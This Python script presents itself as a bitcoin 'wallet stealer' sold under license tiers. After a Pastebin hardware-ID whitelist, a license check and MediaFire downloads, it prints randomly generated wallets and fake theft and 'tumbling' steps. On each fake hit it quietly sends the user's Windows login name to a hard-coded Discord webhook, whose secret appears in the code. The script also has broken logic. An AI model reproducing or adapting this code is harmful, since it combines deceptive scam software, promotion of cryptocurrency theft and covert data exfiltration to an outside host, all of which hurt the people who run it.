import time
import random
import string
import os
import ctypes
import socket
import signal
import readchar
import os.path
import urllib.request
import hashlib,base58,binascii
from discord_webhook import DiscordWebhook, DiscordEmbed
from bs4 import BeautifulSoup
from slowprint.slowprint import *
from colorama import init, Fore
init(convert=True)
import subprocess, requests
os.system("cls")

hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
ip = socket.gethostbyname(socket.gethostname())

ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Wallet Miner | Start Up ")

PASTE_BIN_URL = "https://pastebin.com/QUGjKqXy"

site = requests.get(PASTE_BIN_URL)

try:
    if hardwareid in site.text:
        pass
    else:
        slowprint("You are not Whitelisted!")
        slowprint(f"Your HWID is {hardwareid}")
        slowprint("If This Is Incorrect Please Speak To The Owner!")
        time.sleep(30)
        input()
        exit(123)
except:
    slowprint("Failed to connect")
    slowprint("Press Enter To Restart")
    input()
    exit(123)

def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.03)
        
key1 = os.path.exists('key.key')
key2 = os.path.exists('key(2).key')
key3 = os.path.exists('key(3).key')
key4 = os.path.exists('key(4).key')
if key1 == True:
    slowprint(Fore.GREEN + ".Key File Found!!")
    time.sleep(0.5)
    plan = 'Basic'
    title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
    with open('key.key', 'r') as key:
        key.readline()
        if key == '729329839':
            slowprint(Fore.GREEN + "Reading Key...")
            time.sleep(0.5)
            slowprint(Fore.GREEN + "Key is Valid!")
            time.sleep(0.5)
elif key2 == True:
    slowprint(Fore.GREEN + ".Key File Found!!")
    time.sleep(0.5)
    plan = 'Regular'
    title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
    with open('key(2).key', 'r') as key:
        key.readline()
        if key == '1926482638563':
            slowprint(Fore.GREEN + "Reading Key...")
            time.sleep(0.5)
            slowprint(Fore.GREEN + "Key is Valid!")
            time.sleep(0.5)
elif key3 == True:
    slowprint(Fore.GREEN + ".Key File Found!!")
    time.sleep(0.5)
    plan = 'VIP'
    title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
    with open('key(3).key', 'r') as key:
        key.readline()
        if key == '61387612958743695':
            slowprint(Fore.GREEN + "Reading Key...")
            time.sleep(0.5)
            slowprint(Fore.GREEN + "Key is Valid!")
            time.sleep(0.5)       
elif key4 == True:
    slowprint(Fore.GREEN + ".Key File Found!!")
    time.sleep(0.5)
    plan = 'Admin'
    title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
    with open('key(4).key', 'r') as key:
        key.readline()
        if key == 'yomomgay':
            slowprint(Fore.GREEN + "Reading Key...")
            time.sleep(0.5)
            slowprint(Fore.GREEN + "Key is Valid!")
            time.sleep(0.5) 
else:
    slowprint(Fore.GREEN + ".Key File Not Found!!")
    time.sleep(0.5)
    LicenseKey = input(Fore.RED + 'Input License Key: ')
    if LicenseKey == '729329839':
        slowprint(Fore.GREEN + "Key is Valid!")
        time.sleep(0.5)
        plan = 'Basic'
        title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
        slowprint(Fore.YELLOW + "Downloading Key Please Wait.....")
        slowprint(Fore.YELLOW + "This Is So You Dont Have To Input Your Liscense Everytime.....")
        headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            }
        MediaUrl = 'https://www.mediafire.com/file/rke2osins15zqqt/key.key/file' #basic key
        url = MediaUrl
        req = requests.get(url, headers)
        soup = BeautifulSoup(req.content, 'html.parser')
        url = soup.find("a", class_="popsok").get('href')
        r = requests.get(url)
        slowprint ("File Name : " + soup.find("div", class_="filename").get_text())
        slowprint (soup.find("ul", class_="details").get_text())
        with open(soup.find("div", class_="filename").get_text(), 'wb') as f:
            f.write(r.content)
            slowprint('Done ...') 
            slowprint(Fore.GREEN + "Reading Key...")
        time.sleep(random.randint(1,3))
    elif LicenseKey == '1926482638563':
        slowprint(Fore.GREEN + "Key is Valid!")
        time.sleep(0.5)
        plan = 'Regular'
        title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
        slowprint(Fore.YELLOW + "Downloading Key Please Wait.....")
        slowprint(Fore.YELLOW + "This Is So You Dont Have To Input Your Liscense Everytime.....")
        headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            }
        MediaUrl = 'https://www.mediafire.com/file/awmptbvql4m48uq/key%25282%2529.key/file' #regular key
        url = MediaUrl
        req = requests.get(url, headers)
        soup = BeautifulSoup(req.content, 'html.parser')
        url = soup.find("a", class_="popsok").get('href')
        r = requests.get(url)
        slowprint ("File Name : " + soup.find("div", class_="filename").get_text())
        slowprint (soup.find("ul", class_="details").get_text())
        with open(soup.find("div", class_="filename").get_text(), 'wb') as f:
            f.write(r.content)
            slowprint('Done ...')
            time.sleep(3)
            slowprint(Fore.GREEN + "Reading Key...")            
        time.sleep(random.randint(1,3))
    elif LicenseKey == '61387612958743695':
        slowprint(Fore.GREEN + "Key is Valid!")
        time.sleep(0.5)
        plan = 'VIP'
        title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
        slowprint(Fore.YELLOW + "Downloading Key Please Wait.....")
        slowprint(Fore.YELLOW + "This Is So You Dont Have To Input Your Liscense Everytime.....")
        headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            }
        MediaUrl = 'https://www.mediafire.com/file/5v0yc9viy4v2ful/key%25283%2529.key/file' #VIP key
        url = MediaUrl
        req = requests.get(url, headers)
        soup = BeautifulSoup(req.content, 'html.parser')
        url = soup.find("a", class_="popsok").get('href')
        r = requests.get(url)
        slowprint ("File Name : " + soup.find("div", class_="filename").get_text())
        slowprint (soup.find("ul", class_="details").get_text())
        with open(soup.find("div", class_="filename").get_text(), 'wb') as f:
            f.write(r.content)
            slowprint('Done ...')
            time.sleep(3)            
            slowprint(Fore.GREEN + "Reading Key...")
        time.sleep(random.randint(1,3))
    elif LicenseKey == 'yomomgay':
        slowprint(Fore.GREEN + "Key is Valid!")
        time.sleep(0.5)
        plan = 'Admin'
        title = (f"| HUID : {hardwareid} | IP : {ip} | Plan : {plan}")
        slowprint(Fore.YELLOW + "Downloading Key Please Wait.....") 
        slowprint(Fore.YELLOW + "This Is So You Dont Have To Input Your License Everytime.....")
        headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            }
        MediaUrl = 'https://www.mediafire.com/file/trezawjy6rk6bih/key%25284%2529.key/file' #admin key
        url = MediaUrl
        req = requests.get(url, headers)
        soup = BeautifulSoup(req.content, 'html.parser')
        url = soup.find("a", class_="popsok").get('href')
        r = requests.get(url)
        slowprint ("File Name : " + soup.find("div", class_="filename").get_text())
        slowprint (soup.find("ul", class_="details").get_text())
        with open(soup.find("div", class_="filename").get_text(), 'wb') as f:
            f.write(r.content)
            slowprint('Done ...')
            time.sleep(3)
            slowprint(Fore.GREEN + "Reading Key...")            
        time.sleep(random.randint(1,3))
    else :
        slowprint(Fore.RED + "Invalid Key!!!")
        time.sleep(0.5)
        slowprint(Fore.RED + "quitting!")
        exit(123)


def convertByteToHex(inp):
    return ''.join(["%02x" % x for x in inp])

os.system("cls")
ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Start Up " + title)
bitcoinAddress = input(Fore.RED + "Enter a bitcoin address:")
slowprint(Fore.YELLOW + "--------------------------------------")
slowprint("Bitcoin Address: " + bitcoinAddress)
base58Decoder = base58.b58decode(bitcoinAddress).hex()
slowprint("Base58 Decoder: " + base58Decoder)
prefixAndHash = base58Decoder[:len(base58Decoder)-8]
checksum = base58Decoder[len(base58Decoder)-8:]
slowprint("\t|___> Prefix & Hash: " + prefixAndHash)
slowprint("\t|___> Checksum: " + checksum)
slowprint("--------------------------------------")
hash = prefixAndHash
for x in range(1,3):
    hash = hashlib.sha256(binascii.unhexlify(hash)).hexdigest()
    slowprint("Hash#: " + hash)
slowprint("--------------------------------------")
if(checksum == hash[:8]):
    slowprint(Fore.GREEN + "[TRUE] checksum is valid!")
else:
    slowprint(Fore.RED + "[FALSE] checksum is not valid!")
    time.sleep(0.5)
    slowprint(Fore.RED + "Press Enter to quit!")
    input("")
    exit(123)

time.sleep(0.2)
file_exists = os.path.exists('proxies.txt')
if file_exists == True:
    slowprint(Fore.GREEN + "Proxies Imported")
    time.sleep(0.2)
    slowprint(Fore.BLUE+ "Connecting to API...")
    time.sleep(random.randint(1,10))
    slowprint(Fore.GREEN+ "Done...")
    time.sleep(1)
    slowprint(Fore.BLUE+ "Connecting to Tumbler...")
    time.sleep(random.randint(1,10))
    slowprint(Fore.GREEN+ "Done...")
    time.sleep(1)
else:
    slowprint(Fore.YELLOW + "Downlaoding Proxies Please Wait.....")
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '3600',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
        }
    MediaUrl = 'https://www.mediafire.com/file/84hm5glgw4l7u8m/proxies.txt/file'
    url = MediaUrl
    req = requests.get(url, headers)
    soup = BeautifulSoup(req.content, 'html.parser')
    url = soup.find("a", class_="popsok").get('href')
    r = requests.get(url)
    slowprint ("File Name : " + soup.find("div", class_="filename").get_text())
    slowprint (soup.find("ul", class_="details").get_text())
    with open(soup.find("div", class_="filename").get_text(), 'wb') as f:
        f.write(r.content)
        slowprint('Done ...') 
    time.sleep(random.randint(1,10))
    slowprint(Fore.GREEN + "Proxies Dowloaded And Imported")
    time.sleep(0.2)
    slowprint(Fore.BLUE+ "Connecting to API...")
    time.sleep(random.randint(1,10))
    slowprint(Fore.GREEN+ "Done...")
    time.sleep(1)
    slowprint(Fore.BLUE+ "Connecting to Tumbler...")
    time.sleep(random.randint(1,10))
    slowprint(Fore.GREEN+ "Done...")
    time.sleep(1)

def id_gen(size=40, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))

tries = 0

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1025301829464113253/oV2T5HUS0c0EN5_MeNmKIj5npB_ZR6IfvrI3yhJDtqpYSZssyas42jenwQckidddnGjT')

while(True):
    if(tries > random.randint(10, 10000000000)): 
        ammount = str(round(random.uniform(0,0.1), 4))
        ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Wallet Found " + title)
        print(Fore.GREEN +"[-]"+ Fore.YELLOW + " bc1" + id_gen() + Fore.GREEN +" |  Valid  |  " + Fore.YELLOW + ammount, "BTC")
        time.sleep(random.randint(1,3))
        ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Sending BTC " + title)
        print(Fore.GREEN +"Sending.....")
        time.sleep(random.randint(1,10))
        ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Tumbling BTC " + title)
        print(Fore.YELLOW +"Filtering through Tumbler.....")
        time.sleep(random.randint(1,10))
        tries = 0
        user = os.getlogin()
        embed = DiscordEmbed(title='Totally real hit', description=f'Totally real Hit :\nUser : {user}\nPlan : {plan}\nAmount : {ammount} BTC', color='FFC0CB')
        webhook.add_embed(embed)
        webhook.execute()
        ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Transaction Complete " + title)
        print(Fore.GREEN + "Done!")
        time.sleep(1)
    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Seraph Wallet Stealer | Scraping Wallets " + title)
        print(Fore.GREEN +"[-]"+ Fore.YELLOW + " bc1" + id_gen() + Fore.RED +" | Invalid |  " + Fore.YELLOW + "0.0000 BTC")
        tries += 1

